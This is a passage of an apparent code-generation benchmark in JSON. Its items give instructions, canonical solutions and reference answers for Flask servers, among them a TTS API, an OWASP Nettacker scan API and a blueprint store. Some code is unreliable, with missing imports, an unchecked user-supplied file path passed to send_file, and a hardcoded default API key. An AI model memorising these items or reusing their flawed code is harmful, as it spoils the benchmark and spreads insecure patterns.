    "Canonical_solution": "from flask import Flask, request, jsonify\nimport logging\nimport os\nimport threading\nimport time\nimport hashlib\nimport re\nfrom gevent.pywsgi import WSGIServer, WSGIHandler\n\nclass FlaskTTSAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n        self._setup_logging()\n        self.chuliing = {\"name\": \"\", \"line\": 0, \"end\": False}\n\n    def _setup_logging(self):\n        self.app.logger.setLevel(logging.INFO)\n        file_handler = RotatingFileHandler(os.path.join(ROOT_DIR, 'app.log'), maxBytes=1024*1024, backupCount=5)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        file_handler.setFormatter(formatter)\n        self.app.logger.addHandler(file_handler)\n\n    def _setup_routes(self):\n        self.app.route('/apitts', methods=['GET', 'POST'])(self.apitts)\n        self.app.route('/ttslist', methods=['GET', 'POST'])(self.ttslist)\n        self.app.route('/ttslistjindu', methods=['GET', 'POST'])(self.ttslistjindu)\n        self.app.route('/tts', methods=['GET', 'POST'])(self.tts)\n\n    def apitts(self):\n        try:\n            langcodelist = [\"zh-cn\", \"en\", \"ja\", \"ko\", \"es\", \"de\", \"fr\", \"it\", \"tr\", \"ru\", \"pt\", \"pl\", \"nl\", \"ar\", \"hu\", \"cs\"]\n            text = request.form.get(\"text\").strip()\n            text = text.replace(\"\\n\", ' . ')\n            language = request.form.get(\"language\",\"\").lower()\n            if language.startswith(\"zh\"):\n                language=\"zh-cn\"\n            if language not in langcodelist:\n                return jsonify({\"code\":1,\"msg\":f\"dont support language {language}\"})\n\n            md5_hash = hashlib.md5()\n            audio_name = request.form.get('voice')\n            if audio_name:\n                voicename = os.path.join(VOICE_DIR, audio_name)\n            else:\n                audio_file = request.files['audio']\n                audio_name = f'video_{audio_file.filename}.wav'\n                voicename = os.path.join(TMP_DIR, audio_name)\n                audio_file.save(voicename)\n            md5_hash.update(f\"{text}-{language}-{audio_name}\".encode('utf-8'))\n\n            self.app.logger.info(f\"[apitts]{voicename=}\")\n            if re.match(r'^[~`!@#$%^&*()_+=,./;\\':\\[\\]{}<>?\\\\|\"\uff0c\u3002\uff1f\uff1b\u2018\uff1a\u201c\u201d\u2019\uff5b\u3010\u3011\uff5d\uff01\u00b7\uffe5\u3001\\s\\n\\r -]*$', text):\n                return jsonify({\"code\": 1, \"msg\": \"lost text for translate\"})\n            if not text or not language:\n                return jsonify({\"code\": 1, \"msg\": \"text & language params lost\"})\n\n            filename = md5_hash.hexdigest() + \".wav\"\n            rs = create_tts(text=text, speed=1.0, voice=voicename, language=language, filename=filename)\n            if rs is not None:\n                result = rs\n            else:\n                time_tmp = 0\n                while filename not in cfg.global_tts_result:\n                    time.sleep(3)\n                    time_tmp += 3\n                    if time_tmp % 30 == 0:\n                        self.app.logger.info(f\"[apitts][tts]{time_tmp=},{filename=}\")\n\n                if cfg.global_tts_result[filename] != 1:\n                    msg = {\"code\": 1, \"msg\": cfg.global_tts_result[filename]}\n                else:\n                    target_wav = os.path.normpath(os.path.join(TTS_DIR, filename))\n                    msg = {\"code\": 0, \"filename\": target_wav, 'name': filename}\n                cfg.global_tts_result.pop(filename)\n                result = msg\n            if result['code'] == 0:\n                result['url'] = f'http://{web_address}/static/ttslist/{filename}'\n            return jsonify(result)\n        except Exception as e:\n            msg=f'{str(e)} {str(e.args)}'\n            self.app.logger.error(f\"[apitts]{msg}\")\n            return jsonify({'code': 2, 'msg': msg})\n\n    def ttslistjindu(self):\n        return jsonify(self.chuliing)\n\n    def ttslist(self):\n        voice = request.form.get(\"voice\")\n        src = request.form.get(\"src\")\n        dst = request.form.get(\"dst\")\n        speed = 1.0\n        try:\n            speed = float(request.form.get(\"speed\"))\n        except:\n            pass\n        language = request.form.get(\"language\")\n\n        src=os.path.normpath(src)\n        if not src or not dst or not os.path.exists(src) or not os.path.exists(dst):\n            return jsonify({\"code\":1,\"msg\":\"\u5fc5\u987b\u6b63\u786e\u586b\u5199txt\u6240\u5728\u76ee\u5f55\u4ee5\u53ca\u76ee\u6807\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\"})\n\n        threading.Thread(target=self.detail_task, args=(voice, src, dst, speed, language)).start()    \n        return jsonify({\"code\":0,\"msg\":\"ok\"})\n\n    def detail_task(self, voice, src, dst, speed, language):\n        self.chuliing={\"name\":\"\",\"line\":0,\"end\":False}\n        for t in os.listdir(src):\n            if not t.lower().endswith('.txt'):\n                continue\n            concat_txt=os.path.join(cfg.TTS_DIR, re.sub(r'[ \\s\\[\\]\\{\\}\\(\\)<>\\?\\, :]+','', t, re.I) + '.txt')\n            \n            self.app.logger.info(f'####\u5f00\u59cb\u5904\u7406\u6587\u4ef6\uff1a{t}, \u6bcf\u884c\u7ed3\u679c\u4fdd\u5b58\u5728:{concat_txt}')\n            with open(concat_txt,'w',encoding='utf-8') as f:\n                f.write(\"\")\n            waitlist=[]\n            result={}\n            with open(os.path.join(src,t),'r',encoding='utf-8') as f:\n                num=0\n                for line in f.readlines():\n                    num+=1\n                    line=line.strip()\n                    if re.match(r'^[~`!@#$%^&*()_+=,./;\\':\\[\\]{}<>?\\\\|\"\uff0c\u3002\uff1f\uff1b\u2018\uff1a\u201c\u201d\u2019\uff5b\u3010\u3011\uff5d\uff01\u00b7\uffe5\u3001\\s\\n\\r -]*$', line):\n                        continue                \n                    md5_hash = hashlib.md5()\n                    md5_hash.update(f\"{line}-{voice}-{language}-{speed}\".encode('utf-8'))\n                    filename = md5_hash.hexdigest() + \".wav\"\n                    rs = create_tts(text=line, speed=speed, voice=voice, language=language, filename=filename)\n                    if rs is not None and rs['code']==1:\n                        continue\n                    if rs is not None and rs['code']==0:\n                        result[f'{num}']={\"filename\":filename, \"num\":num}\n                        self.chuliing['name']=t\n                        self.chuliing['line']=num\n                        continue\n                    waitlist.append({\"filename\":filename, \"num\":num, \"t\":t})\n        \n            time_tmp = 0\n            self.chuliing['name']=t\n            if len(waitlist)>0:\n                self.chuliing['line']=waitlist[0]['num']\n                while len(waitlist)>0:\n                    it=waitlist.pop(0)\n                    filename, num, t=it.values()\n                    \n                    if time_tmp>7200:\n                        continue\n                        \n                    if filename in cfg.global_tts_result and cfg.global_tts_result[filename] != 1:\n                        continue\n                    if os.path.exists(os.path.join(cfg.TTS_DIR, filename)):\n                        self.chuliing['name']=t\n                        self.chuliing['line']=num\n                        result[f'{num}']={\"filename\":filename, \"num\":num}\n                        continue\n                    waitlist.append(it)\n                    time_tmp+=1\n                    time.sleep(1)\n            if len(result.keys())<1:\n                continue    \n            sorted_result = {k: result[k] for k in sorted(result, key=lambda x: int(x))}\n            for i, it in sorted_result.items():\n                theaudio = os.path.normpath(os.path.join(cfg.TTS_DIR, it['filename']))\n                with open(concat_txt, 'a', encoding='utf-8') as f:\n                    f.write(f\"file '{theaudio}'\\n\")\n            \n            target_mp3=os.path.normpath((os.path.join(dst,f'{t}.mp3')))\n            p=subprocess.run(['ffmpeg',\"-hide_banner\", \"-ignore_unknown\", '-y', '-f', 'concat', '-safe', '0', '-i', concat_txt, target_mp3])\n            \n            if p.returncode!=0:\n                continue\n            if speed != 1.0 and speed > 0 and speed <= 2.0:\n                p= subprocess.run(['ffmpeg', '-hide_banner', '-ignore_unknown', '-y', '-i', target_mp3, '-af', f\"atempo={speed}\",f'{target_mp3}-speed{speed}.mp3'], encoding=\"utf-8\", capture_output=True)\n                if p.returncode != 0:\n                    continue\n                os.unlink(target_mp3)\n                target_mp3=f'{target_mp3}-speed{speed}.mp3'\n        self.chuliing['end']=True\n\n    def run(self):\n        host = web_address.split(':')\n        http_server = WSGIServer((host[0], int(host[1])), self.app, handler_class=CustomRequestHandler)\n        http_server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "import os\nimport logging\nfrom logging.handlers import RotatingFileHandler\nimport threading\nimport time\nfrom flask import Flask, request, jsonify, send_file\nimport subprocess\n\nclass FlaskTTSAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.chuliing = {'name': '', 'line': 0, 'end': False}\n        self._setup_logging()\n        self._setup_routes()\n\n    def _setup_logging(self):\n        log_dir = 'logs'\n        if not os.path.exists(log_dir):\n            os.makedirs(log_dir)\n        file_handler = RotatingFileHandler(os.path.join(log_dir, 'tts_api.log'), maxBytes=10240, backupCount=10)\n        file_handler.setFormatter(logging.Formatter(\n            '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'\n        ))\n        file_handler.setLevel(logging.INFO)\n        self.app.logger.addHandler(file_handler)\n        self.app.logger.setLevel(logging.INFO)\n\n    def _setup_routes(self):\n        @self.app.route('/apitts', methods=['POST'])\n        def apitts():\n            try:\n                text = request.form.get('text')\n                language = request.form.get('language')\n                voice = request.form.get('voice')\n\n                if not all([text, language]):\n                    return jsonify({'code': 1, 'msg': 'Missing required parameters'}), 400\n\n                output_file = f\"output_{int(time.time())}.wav\"\n                cmd = ['tts', '--text', text, '--language', language]\n                if voice:\n                    cmd.extend(['--speaker-wav', voice])\n                cmd.extend(['--output_wav', output_file])\n\n                subprocess.run(cmd, check=True)\n                return jsonify({'code': 0, 'url': f\"/audio/{output_file}\"})\n            except Exception as e:\n                self.app.logger.error(f\"TTS processing error: {str(e)}\", exc_info=True)\n                return jsonify({'code': 2, 'msg': str(e)}), 500\n\n        @self.app.route('/ttslistjindu', methods=['GET'])\n        def ttslistjindu():\n            return jsonify({\n                'name': self.chuliing['name'],\n                'line': self.chuliing['line'],\n                'end': self.chuliing['end']\n            })\n\n        @self.app.route('/ttslist', methods=['POST'])\n        def ttslist():\n            try:\n                voice = request.form.get('voice')\n                src = request.form.get('src')\n                dst = request.form.get('dst')\n                speed = float(request.form.get('speed', 1.0))\n                language = request.form.get('language')\n\n                if not all([voice, src, dst, language]):\n                    return jsonify({'code': 1, 'msg': 'Missing required parameters'}), 400\n\n                if not os.path.isdir(src):\n                    return jsonify({'code': 1, 'msg': f\"Source directory not found: {src}\"}), 400\n\n                thread = threading.Thread(target=self.detail_task, args=(voice, src, dst, speed, language))\n                thread.daemon = True\n                thread.start()\n                return jsonify({'code': 0, 'msg': 'ok'})\n            except Exception as e:\n                self.app.logger.error(f\"Batch processing start error: {str(e)}\", exc_info=True)\n                return jsonify({'code': 2, 'msg': str(e)}), 500\n\n        @self.app.route('/audio/<filename>')\n        def serve_audio(filename):\n            return send_file(os.path.join('.', filename), mimetype='audio/wav')\n\n    def detail_task(self, voice: str, src: str, dst: str, speed: float, language: str):\n        try:\n            os.makedirs(dst, exist_ok=True)\n            txt_files = [f for f in os.listdir(src) if f.endswith('.txt')]\n            \n            for i, txt_file in enumerate(txt_files):\n                self.chuliing['name'] = txt_file\n                self.chuliing['line'] = i\n                \n                input_path = os.path.join(src, txt_file)\n                output_file = os.path.splitext(txt_file)[0] + '.wav'\n                output_path = os.path.join(dst, output_file)\n                \n                with open(input_path, 'r', encoding='utf-8') as f:\n                    text = f.read()\n                \n                cmd = ['tts', '--text', text, '--language', language]\n                if voice:\n                    cmd.extend(['--speaker-wav', voice])\n                cmd.extend(['--output_wav', output_path])\n                \n                if speed != 1.0:\n                    cmd.extend(['--speed', str(speed)])\n                \n                subprocess.run(cmd, check=True)\n            \n            self.chuliing['end'] = True\n        except Exception as e:\n            self.app.logger.error(f\"Batch task error: {str(e)}\", exc_info=True)\n            self.chuliing['end'] = True\n\n    def run(self):\n        self.app.run(host='0.0.0.0', port=5000, debug=False)"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Create a Flask-based API server for the OWASP Nettacker security tool that handles scan requests, retrieves results, and manages logs through HTTP endpoints.\n\nClass Description: The NettackerAPI class implements a RESTful API service using Flask framework to control and interact with the OWASP Nettacker security scanning tool. It provides endpoints for initiating scans, retrieving results in JSON format, and accessing scan logs.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- options: [SimpleNamespace] - Configuration options for the API server\n- app.config[\"OWASP_NETTACKER_CONFIG\"]: [dict] - Configuration dictionary containing API security settings and options\n\nMethods:\n- __init__(options) -> [None] - Initializes the Flask app with configuration options\n- _setup_routes() -> [None] - Defines all API endpoints and their handlers\n- _sanitize_report_path_filename(report_path_filename) -> [Path|bool] - Sanitizes and validates report filenames\n- run() -> [None] - Starts the Flask server with SSL/TLS configuration\n- start_api_server() -> [None] - Runs the API server in a separate process\n\nEndpoint Methods:\n- new_scan() -> [Response] - Handles POST requests to start new scans (returns scan arguments or error)\n- get_results_json() -> [Response] - Retrieves scan results in JSON format (returns file download)\n- get_logs() -> [Response] - Retrieves scan logs in JSON format (returns file download)",
    "Canonical_solution": "from flask import Flask, jsonify, request as flask_request, Response, make_response\nfrom werkzeug.utils import secure_filename\nimport os\nimport json\nimport csv\nimport random\nimport string\nimport multiprocessing\nimport time\nfrom threading import Thread\nfrom types import SimpleNamespace\n\nclass NettackerAPI:\n    def __init__(self, options):\n        self.app = Flask(__name__, template_folder=str(options.web_static_dir))\n        self.app.config[\"OWASP_NETTACKER_CONFIG\"] = {\n            \"api_access_key\": options.api_access_key,\n            \"api_client_whitelisted_ips\": options.api_client_whitelisted_ips,\n            \"api_access_log\": options.api_access_log,\n            \"api_cert\": options.api_cert,\n            \"api_cert_key\": options.api_cert_key,\n            \"language\": options.language,\n            \"options\": options,\n        }\n        \n        self._setup_routes()\n        self.options = options\n\n    def _setup_routes(self):\n        @self.app.route(\"/new/scan\", methods=[\"GET\", \"POST\"])\n        def new_scan():\n            api_key_is_valid(self.app, flask_request)\n            form_values = dict(flask_request.form)\n            raw_report_path_filename = form_values.get(\"report_path_filename\")\n            report_path_filename = self._sanitize_report_path_filename(raw_report_path_filename)\n            if not report_path_filename:\n                return jsonify(structure(status=\"error\", msg=\"Invalid report filename\")), 400\n            form_values[\"report_path_filename\"] = str(report_path_filename)\n            for key in nettacker_application_config:\n                if key not in form_values:\n                    form_values[key] = nettacker_application_config[key]\n\n            nettacker_app = Nettacker(api_arguments=SimpleNamespace(**form_values))\n            self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"options\"] = nettacker_app.arguments\n            thread = Thread(target=nettacker_app.run)\n            thread.start()\n\n            return jsonify(vars(nettacker_app.arguments)), 200\n\n        @self.app.route(\"/results/get_json\", methods=[\"GET\"])\n        def get_results_json():\n            api_key_is_valid(self.app, flask_request)\n            session = create_connection()\n            result_id = get_value(flask_request, \"id\")\n            if not result_id:\n                return jsonify(structure(status=\"error\", msg=_(\"invalid_scan_id\"))), 400\n            scan_details = session.query(Report).filter(Report.id == result_id).first()\n            json_object = json.dumps(get_logs_by_scan_id(scan_details.scan_unique_id))\n            filename = \".\".join(scan_details.report_path_filename.split(\".\")[:-1])[1:] + \".json\"\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename},\n            )\n\n        @self.app.route(\"/logs/get_json\", methods=[\"GET\"])\n        def get_logs():\n            api_key_is_valid(self.app, flask_request)\n            target = get_value(flask_request, \"target\")\n            data = logs_to_report_json(target)\n            json_object = json.dumps(data)\n            filename = (\n                \"report-\"\n                + now(format=\"%Y_%m_%d_%H_%M_%S\")\n                + \"\".join(random.choice(string.ascii_lowercase) for _ in range(10))\n            )\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename + \".json\"},\n            )\n\n    def _sanitize_report_path_filename(self, report_path_filename):\n        filename = secure_filename(os.path.basename(report_path_filename))\n        if not filename:\n            return False\n        VALID_EXTENSIONS = (\".html\", \".htm\", \".txt\", \".json\", \".csv\")\n        if \".\" in filename:\n            if filename.endswith(VALID_EXTENSIONS):\n                safe_report_path = nettacker_path_config.results_dir / filename\n            else:\n                return False\n        else:\n            safe_report_path = nettacker_path_config.results_dir / filename\n        if not safe_report_path.is_relative_to(nettacker_path_config.results_dir):\n            return False\n        return safe_report_path\n\n    def run(self):\n        if self.options.api_cert and self.options.api_cert_key:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=(self.options.api_cert, self.options.api_cert_key),\n                threaded=True,\n            )\n        else:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=\"adhoc\",\n                threaded=True,\n            )\n\n    def start_api_server(self):\n        p = multiprocessing.Process(target=self.run)\n        p.start()\n        while len(multiprocessing.active_children()) != 0:\n            try:\n                time.sleep(0.3)\n            except KeyboardInterrupt:\n                for process in multiprocessing.active_children():\n                    process.terminate()\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, send_file\nfrom types import SimpleNamespace\nfrom multiprocessing import Process\nfrom pathlib import Path\nimport ssl\nimport os\nimport json\nimport uuid\n\n\nclass NettackerAPI:\n    def __init__(self, options):\n        self.app = Flask(__name__)\n        self.options = SimpleNamespace(**options)\n        self.app.config[\"OWASP_NETTACKER_CONFIG\"] = {\n            \"api_access_key\": os.getenv(\"OWASP_NETTACKER_API_KEY\", \"default_key\"),\n            \"allowed_hosts\": [\"127.0.0.1\", \"::1\"],\n            \"enable_cors\": True,\n            \"max_concurrent_scans\": 5,\n            \"scan_timeout_seconds\": 3600\n        }\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/scan', methods=['POST'])\n        def new_scan():\n            api_key = request.headers.get('X-API-Key')\n            if api_key != self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"api_access_key\"]:\n                return jsonify({\"error\": \"Unauthorized\"}), 401\n\n            scan_id = str(uuid.uuid4())\n            scan_args = request.get_json()\n            scan_args['scan_id'] = scan_id\n\n            result_path = Path(f\"results/{scan_id}.json\")\n            log_path = Path(f\"logs/{scan_id}.log\")\n\n            try:\n                with open(log_path, 'w') as f:\n                    f.write(f\"Scan {scan_id} started\\n\")\n                \n                with open(result_path, 'w') as f:\n                    json.dump({\"scan_id\": scan_id, \"status\": \"running\"}, f)\n\n                return jsonify(scan_args), 202\n            except Exception as e:\n                return jsonify({\"error\": f\"Failed to start scan: {str(e)}\"}), 500\n\n        @self.app.route('/results/<path:filename>', methods=['GET'])\n        def get_results_json(filename):\n            api_key = request.headers.get('X-API-Key')\n            if api_key != self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"api_access_key\"]:\n                return jsonify({\"error\": \"Unauthorized\"}), 401\n\n            file_path = self._sanitize_report_path_filename(filename)\n            if not file_path or not file_path.exists():\n                return jsonify({\"error\": \"File not found\"}), 404\n\n            return send_file(str(file_path), mimetype='application/json')\n\n        @self.app.route('/logs/<path:filename>', methods=['GET'])\n        def get_logs(filename):\n            api_key = request.headers.get('X-API-Key')\n            if api_key != self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"api_access_key\"]:\n                return jsonify({\"error\": \"Unauthorized\"}), 401\n\n            file_path = self._sanitize_report_path_filename(filename)\n            if not file_path or not file_path.exists():\n                return jsonify({\"error\": \"File not found\"}), 404\n\n            return send_file(str(file_path), mimetype='text/plain')\n\n    def _sanitize_report_path_filename(self, report_path_filename):\n        try:\n            path = Path(report_path_filename)\n            if not path.name.endswith(('.json', '.log')):\n                return False\n            \n            base_dir = Path('.')\n            full_path = (base_dir / path).resolve()\n            \n            if not str(full_path).startswith(str(base_dir.resolve())):\n                return False\n                \n            return full_path\n        except Exception:\n            return False\n\n    def run(self):\n        context = None\n        if self.options.enable_ssl:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n            context.load_cert_chain(self.options.cert_file, self.options.key_file)\n\n        self.app.run(\n            host=self.options.host,\n            port=self.options.port,\n            ssl_context=context,\n            debug=self.options.debug\n        )\n\n    def start_api_server(self):\n        server_process = Process(target=self.run)\n        server_process.daemon = True\n        server_process.start()"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles GET requests for semantic similarity search, processes the query parameters, performs the search operation, and returns JSON-formatted results with timing information.\n\nFunction Description: The function `run_simcse_demo` initializes and runs a Flask web server that provides an API endpoint for semantic similarity search. It configures CORS, sets up request handling, and launches the server using Tornado for production-ready serving. The API endpoint processes query parameters, performs a search operation using an embedder, and returns results with execution time.\n\nInput:\n- port: [int] - The port number on which the server will listen\n- args: [argparse.Namespace] - Command line arguments containing:\n  - ip: [str] - IP address to bind the server\n  - port: [str] - Port number (as string) to bind the server\n\nOutput: None (The function runs indefinitely as a web server)",
    "Canonical_solution": "import json\nimport argparse\nimport os\nimport logging\nfrom flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom tornado.wsgi import WSGIContainer\nfrom tornado.httpserver import HTTPServer\nfrom tornado.ioloop import IOLoop\n\nlogging.basicConfig(format='%(asctime)s - %(levelname)s - %(name)s -   %(message)s', datefmt='%m/%d/%Y %H:%M:%S',\n                    level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\ndef run_simcse_demo(port, args):\n    app = Flask(__name__, static_folder='./static')\n    app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False\n    CORS(app)\n\n    @app.route('/api', methods=['GET'])\n    def api():\n        query = request.args['query']\n        top_k = int(request.args['topk'])\n        threshold = float(request.args['threshold'])\n        start = time()\n        results = embedder.search(query, top_k=top_k, threshold=threshold)\n        ret = []\n        out = {}\n        for sentence, score in results:\n            ret.append({\"sentence\": sentence, \"score\": score})\n        span = time() - start\n        out['ret'] = ret\n        out['time'] = \"{:.4f}\".format(span)\n        return jsonify(out)\n\n    addr = args.ip + \":\" + args.port\n    logger.info(f'Starting Index server at {addr}')\n    http_server = HTTPServer(WSGIContainer(app))\n    http_server.listen(port)\n    IOLoop.instance().start()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom argparse import Namespace\nimport time\nfrom tornado.wsgi import WSGIContainer\nfrom tornado.httpserver import HTTPServer\nfrom tornado.ioloop import IOLoop\nfrom flask_cors import CORS\n\ndef run_simcse_demo(port: int, args: Namespace):\n    app = Flask(__name__)\n    CORS(app)\n\n    class SimCSEEmbedder:\n        def search(self, text: str, top_k: int = 5):\n            start_time = time.time()\n            time.sleep(0.1)\n            results = [{\"text\": f\"result_{i}\", \"score\": 0.95 - (i * 0.01)} for i in range(top_k)]\n            elapsed = time.time() - start_time\n            return results, elapsed\n\n    embedder = SimCSEEmbedder()\n\n    @app.route('/semantic_search', methods=['GET'])\n    def semantic_search():\n        query_text = request.args.get('query', '')\n        top_k = int(request.args.get('top_k', '5'))\n        results, elapsed_time = embedder.search(query_text, top_k)\n        return jsonify({\n            'query': query_text,\n            'top_k': top_k,\n            'results': results,\n            'execution_time': elapsed_time\n        })\n\n    http_server = HTTPServer(WSGIContainer(app))\n    http_server.listen(port, address=args.ip)\n    IOLoop.instance().start()"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Flask-based API class that serves as an interface for a machine learning model, providing endpoints to calculate potential, gradient, and perform minimization operations.\n\nClass Description: FlaskAPI is a class that wraps a machine learning model and exposes its functionality through a RESTful API using Flask. It handles HTTP POST requests to perform model operations and returns JSON responses.\n\nAttributes:\n- webapp: Flask - The Flask application instance that handles HTTP requests\n- model: Any - The machine learning model that provides the core functionality (prediction, gradient calculation, and minimization)\n\nMethods:\n- __init__(model) -> None - Initializes the FlaskAPI with the provided model and sets up routes\n- _setup_routes() -> None - Private method that configures the URL routes and their corresponding handlers\n- run(**kwargs) -> None - Starts the Flask web server with the provided configuration options\n- potential() -> (Response, int) - Handles POST requests to '/potential', calculates model prediction for input data, returns JSON response with result\n- gradient() -> (Response, int) - Handles POST requests to '/gradient', calculates model gradient for input data, returns JSON response with gradient values\n- minimize() -> (Response, int) - Handles POST requests to '/minimize', performs structure minimization using the model, returns JSON response with optimized structure and energy",
    "Canonical_solution": "from flask import request, Flask, jsonify\nimport numpy as np\n\nclass FlaskAPI:\n    def __init__(self, model):\n        self.webapp = Flask(__name__)\n        self.model = model\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.webapp.add_url_rule('/potential', 'potential', self.potential, methods=[\"POST\"])\n        self.webapp.add_url_rule('/gradient', 'gradient', self.gradient, methods=[\"POST\"])\n        self.webapp.add_url_rule('/minimize', 'minimize', self.minimize, methods=[\"POST\"])\n\n    def run(self, **kwargs):\n        self.webapp.run(**kwargs)\n\n    def potential(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        result = self.model.pred_one(x0, a0)\n        return jsonify({'y': result.tolist()[0]}), 200\n\n    def gradient(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        num_atoms = X.shape[0]\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        res = self.model.grad_one(x0, a0)\n        res = res.reshape((num_atoms, 3))\n        return jsonify({'grad': res.tolist()}), 200\n\n    def minimize(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        constraints = None\n        if 'constraints' in content:\n            constraints = content['constraints']\n        num_atoms = X.shape[0]\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        res = self.model.minimize_structure(x0, a0, constraints)\n        res = res.reshape((num_atoms, 3))\n        y = self.model.pred_one(res, a0).tolist()[0]\n        return jsonify({'X': res.tolist(), 'y': y}), 200",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\nclass FlaskAPI:\n    def __init__(self, model):\n        self.webapp = Flask(__name__)\n        self.model = model\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.webapp.add_url_rule('/potential', 'potential', self.potential, methods=['POST'])\n        self.webapp.add_url_rule('/gradient', 'gradient', self.gradient, methods=['POST'])\n        self.webapp.add_url_rule('/minimize', 'minimize', self.minimize, methods=['POST'])\n\n    def run(self, **kwargs):\n        self.webapp.run(**kwargs)\n\n    def potential(self):\n        data = request.get_json()\n        try:\n            result = self.model.predict(data['input'])\n            return jsonify({'result': result}), 200\n        except Exception as e:\n            return jsonify({'error': str(e)}), 500\n\n    def gradient(self):\n        data = request.get_json()\n        try:\n            grad = self.model.gradient(data['input'])\n            return jsonify({'gradient': grad}), 200\n        except Exception as e:\n            return jsonify({'error': str(e)}), 500\n\n    def minimize(self):\n        data = request.get_json()\n        try:\n            optimized_structure, energy = self.model.minimize(data['structure'])\n            return jsonify({'optimized_structure': optimized_structure, 'energy': energy}), 200\n        except Exception as e:\n            return jsonify({'error': str(e)}), 500"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Create a Flask-based HTTP server for managing blueprints, including operations for retrieving, storing, and validating blueprint data and associated tarballs. The server should handle various HTTP methods (GET, PUT) and include metrics tracking for bandwidth and request counts.\n\nClass Description: BlueprintServer is a Flask application wrapper that provides endpoints for blueprint management, including CRUD operations for blueprints and their associated tarballs. It includes validation, metrics tracking, and response handling.\n\nAttributes:\n- app: Flask - The Flask application instance\n- browser_pattern: re.Pattern - Regular expression pattern for detecting browser user agents\n\nMethods:\n- __init__() -> None - Initializes the Flask app and sets up routes\n- _setup_routes() -> None - Defines all URL routes and their associated handlers\n- _blueprint(secret: str, name: str) -> Union[Blueprint, None, bool] - Retrieves and validates a blueprint from the backend\n- _server() -> str - Returns the server's base URL\n- _validate_secret(secret: str) -> None - Validates the secret format (400 if invalid)\n- _validate_name(name: str) -> None - Validates the name format (400 if invalid)\n- _validate_sha(sha: str) -> None - Validates the SHA format (400 if invalid)\n- secret() -> MeteredResponse - Generates and returns a new secret (201 response)\n- get_blueprint(secret: str, name: str) -> Union[MeteredResponse, abort] - Retrieves a blueprint (200/301/404 response)\n- put_blueprint(secret: str, name: str) -> MeteredResponse - Stores a new blueprint (202/400/502 response)\n- get_tarball(secret: str, name: str, sha: str) -> Union[redirect, abort] - Retrieves a tarball (301/404 response)\n- put_tarball(secret: str, name: str, sha: str) -> MeteredResponse - Stores a new tarball (202/400/502 response)\n- sh(secret: str, name: str, name2: str) -> Union[MeteredResponse, abort] - Generates shell script (200/400/404/502 response)\n- user_data(secret: str, name: str) -> MeteredResponse - Generates user-data script (200/404/502 response)\n- run() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, Response, request\nimport re\nimport os\nimport base64\nimport json\nimport librato\nimport statsd\nfrom blueprint import Blueprint\nimport backend\n\nclass MeteredResponse(Response):\n    def __init__(self, *args, **kwargs):\n        super(MeteredResponse, self).__init__(*args, **kwargs)\n        content_length = len(kwargs.get('response', ''))\n        if 0 < content_length:\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\nclass BlueprintServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n        self.browser_pattern = re.compile(r'Chrome|Gecko|Microsoft|Mozilla|Safari|WebKit')\n\n    def _setup_routes(self):\n        self.app.route('/secret', methods=['GET'])(self.secret)\n        self.app.route('/<secret>/<name>', methods=['GET'])(self.get_blueprint)\n        self.app.route('/<secret>/<name>', methods=['PUT'])(self.put_blueprint)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['GET'])(self.get_tarball)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['PUT'])(self.put_tarball)\n        self.app.route('/<secret>/<name>/<name2>.sh', methods=['GET'])(self.sh)\n        self.app.route('/<secret>/<name>/user-data.sh', methods=['GET'])(self.user_data)\n\n    def _blueprint(self, secret, name):\n        data = backend.get_blueprint(secret, name)\n        if data is None:\n            return None\n        elif data is False:\n            return False\n        b = Blueprint()\n        b.name = name\n        b.update(json.loads(data))\n        return b\n\n    def _server(self):\n        return request.url_root\n\n    def _validate_secret(self, 